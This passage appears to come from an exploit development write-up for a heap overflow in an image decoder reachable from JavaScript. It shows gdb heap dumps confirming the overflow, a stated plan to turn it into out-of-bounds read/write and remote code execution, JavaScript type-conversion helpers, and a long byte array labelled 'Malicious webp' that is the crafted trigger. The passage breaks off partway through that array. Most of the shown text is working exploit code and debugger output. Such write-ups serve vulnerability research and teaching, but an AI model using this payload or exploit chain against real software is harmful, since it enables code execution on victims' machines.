<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// Before (Fetch this value during the breakpoint at DecodeImageStream+935)
</span></span><span class="line"><span class="cl">gef&gt; x/30gx $rax+0x3000
</span></span><span class="line"><span class="cl">0x555555b4f880:	0x0000000000000002	0x0000000000000031
</span></span><span class="line"><span class="cl">0x555555b4f890:	0x0000000000000002	0x0000000000000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// After (Fetch this value during the breakpoint at js_math_min_max)
</span></span><span class="line"><span class="cl">gef&gt; x/30gx 0x0000555555b4c880+0x3000
</span></span><span class="line"><span class="cl">0x555555b4f880:	0x0000000000030007	0x0000000000000031
</span></span><span class="line"><span class="cl">0x555555b4f890:	0x0000000000000002	0x0000000000000000
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we know the heap overflow is indeed triggered, we need to start thinking on how to leverage this to gain RCE.</p>
<h4 id="gaining-read-and-write-primitive">Gaining read and write primitive</h4>
<p>The strategy here leverages the heap overflow to overwrite the length of an existing data type, enabling Out-of-Bounds (OOB) read/write capabilities. After experimenting in gdb to achieve an optimal heap layout, I found the following sequence effective.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Helper taken from https://changochen.github.io/2019-04-29-starctf-2019.html
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">var</span> <span class="nx">f64</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u32</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">f64</span><span class="p">.</span><span class="nx">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">d2u</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">u32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">u2d</span><span class="p">(</span><span class="nx">lo</span><span class="p">,</span> <span class="nx">hi</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u32</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">u32</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">hi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">f64</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hex</span><span class="p">(</span><span class="nx">lo</span><span class="p">,</span> <span class="nx">hi</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">lo</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">hi</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;00000000&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">hi</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="nx">lo</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;0x&#34;</span> <span class="o">+</span> <span class="p">(</span><span class="s1">&#39;00000000&#39;</span><span class="o">+</span><span class="nx">hi</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span><span class="p">(</span><span class="s1">&#39;00000000&#39;</span><span class="o">+</span><span class="nx">lo</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Malicious webp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">const</span> <span class="nx">webp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span><span class="mi">82</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">238</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">247</span><span class="p">,</span> <span class="mi">206</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">153</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">187</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">140</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">136</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span class="p">,</span> <span class="mi">204</span><span 